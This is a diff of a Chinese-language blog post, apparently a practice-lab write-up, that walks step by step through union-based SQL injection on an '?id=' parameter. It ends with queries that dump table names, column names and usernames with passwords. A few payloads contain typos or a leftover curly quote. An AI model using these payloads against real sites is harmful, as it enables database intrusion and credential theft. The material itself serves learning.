@@ -1,7 +1,7 @@
 ---
 layout: post
-title:  "初来乍到"
-desc: "我的第一篇博客"
+title:  "我的SQL（1）"
+desc: "新手上路"
 keywords: "sql"
 date: 2016-11-10
 categories: [work]
@@ -11,8 +11,8 @@ icon: fa-bookmark-o
 
 # Writeup
 首先注入
->### ?id=1。
 
+>### ?id=1。
 
 Ok。出现Your Login name和Password。
 
@@ -20,11 +20,13 @@ Ok。出现Your Login name和Password。
 嗯？！出现sql语句报错，说明存在sql注入，因为没有过滤单引号，所以我们可以用单引号来做文章啦。
 
 接下来，就是猜字段了。
+
 >### ?id=1’ order by 3#
 
 可怕的事出现了。报错了。#没有被编码。香菇。上网找了一下#的URL编码为%23
 
 所以改为
+
 >### ?id=1’ order by 3%23
 
 有显示。试了一下4 。呐报错了。只有三个字段。
@@ -40,6 +42,7 @@ What？为什么只显示了当`id=1`的东西。What？真让人头大。只好
 上网一搜。呐id的值通常都是从1开始自增的。我们可以把d设为非正数，浮点数，字符型或字符串都行。
 
 试试?
+
 >### id=0’ union select 1,2,3%23
 
 OK！出来了。太棒了。开始真正搞事情了。、
@@ -49,9 +52,7 @@ OK！出来了。太棒了。开始真正搞事情了。、
 数据库有一个连接函数，常用的是`concat`和`concat_ws`。其中`concat_ws`的第一个参数是连接字符串的分隔符。
 
 {% highlight sql %}
- 
-?id=0’ union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23
-
+?id=0' union select 1,2,concat_ws(char(32,58,32),user(),database(),version())%23
 {% endhighlight %}
 
 呐。出来了出来了。第一个是当前用户，当前数据库和版本信息。
@@ -70,20 +71,18 @@ OK！出来了。太棒了。开始真正搞事情了。、
 介绍完就开干。
 
 {% highlight sql %}
-
-?id=0’ union select 1,2,table_name from information_schema.tables where table_schema=’security’%23
-
+?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'%23
 {% endhighlight %}
 
 数据库默认显示`limit 0,1`。第一个是`emails`。接着找，用`limit`来偏移。具体如下：
 
 {% highlight sql %}
 
-?id=0’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 1,1%23
+?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 1,1%23
 
-?id=0’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 2,1%23
+?id=0’ union select 1,2,table_name from information_schema.tables where table_schema='security' limit 2,1%23
 
-?id=0’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 3,1%23
+?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security'limit 3,1%23
 
 {% endhighlight %}
 
@@ -93,7 +92,7 @@ OK！出来了。太棒了。开始真正搞事情了。、
 
 {% highlight sql %}
 
-?id=0’ union select 1,2,table_name from information_schema.tables where table_schema=’security’ limit 4,1%23
+?id=0' union select 1,2,table_name from information_schema.tables where table_schema='security' limit 4,1%23
 
 {% endhighlight %}
 
@@ -102,9 +101,7 @@ OK！出来了。太棒了。开始真正搞事情了。、
 我们注入当然就只对用户密码有想法啦。所以去爆破`users`哈哈哈、
 
 {% highlight sql %}
-
-?id=0’ union select 1,2,column_name from information_schema.columns where table_shcema=’security’ and table_name=’users’limit 0,1%23
-
+?id=0' union select 1,2,column_name from information_schema.columns where table_shcema='security' and table_name='users' limit 0,1%23
 {% endhighlight %}
 
 不断地偏移。到第四行就报错。也就说有3个字段。
@@ -114,9 +111,7 @@ OK！出来了。太棒了。开始真正搞事情了。、
 Ok！知道字段就开始获取数据啦。直接`select`出来就好啦。
 
 {% highlight sql %}
-
-?id=0’ union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23
-
+?id=0' union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23
 {% endhighlight %}
 
 得到要得到数据。成功。Yeah！
